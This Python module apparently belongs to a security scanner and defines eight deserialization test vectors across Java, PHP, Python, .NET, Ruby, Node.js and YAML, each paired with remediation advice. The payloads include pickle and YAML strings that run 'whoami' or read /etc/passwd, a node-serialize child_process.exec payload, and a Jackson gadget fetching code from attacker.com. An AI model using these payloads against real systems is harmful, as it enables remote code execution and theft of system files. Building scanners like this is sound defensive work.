"""
Deserialization Attack Testing Vectors
Java, PHP, Python, .NET, Ruby deserialization exploits
"""

from ..models import (
    TestVector, VulnerabilityType, TestVectorPosition as Position, PositionType,
    TestVectorPayload as PayloadTemplate, TestVectorEvidence as Evidence, 
    ConfidenceLevel, SensitivityLevel
)

DESERIALIZATION_VECTORS = [
    TestVector(
        id="deser-java-001",
        name="Java Deserialization - Commons Collections",
        description="Java deserialization using Apache Commons Collections",
        vuln_type=VulnerabilityType.DESERIALIZATION,
        position=Position(type=PositionType.BODY_FORM, name="user", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQu",
            variants=[
                "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQu"
            ],
            encoding="base64"
        ),
        expected_evidence=Evidence(
            indicators=["RCE achieved", "Deserialization gadget executed", "System command output"],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Don't deserialize untrusted data. Use allowlist. Update Commons Collections. Use SerialKiller.",
        references=["https://github.com/frohoff/ysoserial"],
        tags=["deserialization", "java", "rce", "commons-collections"]
    ),
    
    TestVector(
        id="deser-php-001",
        name="PHP Object Injection",
        description="PHP deserialization leading to object injection",
        vuln_type=VulnerabilityType.DESERIALIZATION,
        position=Position(type=PositionType.COOKIE, name="user_data", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='O:8:"stdClass":1:{s:4:"name";s:5:"admin";}',
            variants=[
                'O:8:"stdClass":1:{s:4:"name";s:5:"admin";}',
                'O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Object injection successful", "Magic method triggered", "Privilege escalation"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Don't unserialize untrusted data. Use JSON instead. Implement __wakeup protection.",
        references=["https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection"],
        tags=["deserialization", "php", "object-injection"]
    ),
    
    TestVector(
        id="deser-python-001",
        name="Python Pickle Deserialization",
        description="Python pickle arbitrary code execution",
        vuln_type=VulnerabilityType.DESERIALIZATION,
        position=Position(type=PositionType.BODY_FORM, name="data", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="Y29zCnN5c3RlbQpwMAooUyd3aG9hbWknCnAxCnRwMgpScDMKLg==",
            variants=[
                "Y29zCnN5c3RlbQpwMAooUyd3aG9hbWknCnAxCnRwMgpScDMKLg==",
                "Y29zCnN5c3RlbQpwMAooUydjYXQgL2V0Yy9wYXNzd2QnCnAxCnRwMgpScDMKLg=="
            ],
            encoding="base64"
        ),
        expected_evidence=Evidence(
            indicators=["Pickle RCE", "OS command executed", "System compromise"],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Never unpickle untrusted data. Use JSON/YAML. Implement sandboxing.",
        references=["https://davidhamann.de/2020/04/05/exploiting-python-pickle/"],
        tags=["deserialization", "python", "pickle", "rce"]
    ),
    
    TestVector(
        id="deser-dotnet-001",
        name=".NET Binary Formatter Deserialization",
        description=".NET BinaryFormatter RCE",
        vuln_type=VulnerabilityType.DESERIALIZATION,
        position=Position(type=PositionType.BODY_FORM, name="__VIEWSTATE", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEA",
            variants=[
                "AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEA"
            ],
            encoding="base64"
        ),
        expected_evidence=Evidence(
            indicators=[".NET RCE", "ViewState deserialization exploit", "Code execution"],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Don't use BinaryFormatter. Use DataContractSerializer with allowlist. Disable ViewState.",
        references=["https://github.com/pwntester/ysoserial.net"],
        tags=["deserialization", "dotnet", "binaryformatter", "viewstate"]
    ),
    
    TestVector(
        id="deser-ruby-001",
        name="Ruby Marshal Deserialization",
        description="Ruby Marshal.load RCE",
        vuln_type=VulnerabilityType.DESERIALIZATION,
        position=Position(type=PositionType.COOKIE, name="session", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="BAhvOgpDbGFzczYAVQpzeXN0ZW0GOgxAdmFsdWVJIg93aG9hbWkGOgZFVA==",
            variants=[
                "BAhvOgpDbGFzczYAVQpzeXN0ZW0GOgxAdmFsdWVJIg93aG9hbWkGOgZFVA=="
            ],
            encoding="base64"
        ),
        expected_evidence=Evidence(
            indicators=["Ruby RCE", "Marshal gadget executed", "System command output"],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Don't use Marshal.load on untrusted data. Use JSON. Implement safe deserialization.",
        references=["https://blog.rubygems.org/2019/11/08/CVE-2019-8331.html"],
        tags=["deserialization", "ruby", "marshal", "rce"]
    ),
    
    TestVector(
        id="deser-nodejs-001",
        name="Node.js node-serialize Deserialization",
        description="Node.js deserialization RCE",
        vuln_type=VulnerabilityType.DESERIALIZATION,
        position=Position(type=PositionType.COOKIE, name="profile", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\', function(error, stdout, stderr) { console.log(stdout) });}()"}',
            variants=[
                '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\', function(error, stdout, stderr) { console.log(stdout) });}()"}'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Node.js RCE", "Function deserialization", "Command execution"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Don't use node-serialize or similar unsafe libraries. Use JSON.parse. Validate input.",
        references=["https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/"],
        tags=["deserialization", "nodejs", "javascript", "rce"]
    ),
    
    TestVector(
        id="deser-java-jackson-001",
        name="Java Jackson Polymorphic Deserialization",
        description="Jackson polymorphic type handling RCE",
        vuln_type=VulnerabilityType.DESERIALIZATION,
        position=Position(type=PositionType.BODY_JSON, name="data", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='["org.springframework.context.support.ClassPathXmlApplicationContext", "http://attacker.com/exploit.xml"]',
            variants=[
                '["org.springframework.context.support.ClassPathXmlApplicationContext", "http://attacker.com/exploit.xml"]',
                '["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", {"transletBytecodes":["..."], "transletName":"a", "outputProperties":{}}]'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Jackson RCE", "Polymorphic deserialization", "Remote class loading"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Disable default typing in Jackson. Use allowlist for polymorphic types. Update Jackson.",
        references=["https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/"],
        tags=["deserialization", "java", "jackson", "polymorphic"]
    ),
    
    TestVector(
        id="deser-yaml-001",
        name="YAML Deserialization",
        description="YAML deserialization leading to RCE",
        vuln_type=VulnerabilityType.DESERIALIZATION,
        position=Position(type=PositionType.BODY_XML, name="config", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='!!python/object/apply:os.system ["whoami"]',
            variants=[
                '!!python/object/apply:os.system ["whoami"]',
                '!!python/object/apply:subprocess.check_output [["cat", "/etc/passwd"]]'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["YAML RCE", "Python object instantiation", "Command execution"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Use safe_load instead of load. Disable Python object construction. Validate YAML input.",
        references=["https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf"],
        tags=["deserialization", "yaml", "python", "rce"]
    ),
]

# Total vectors: 8
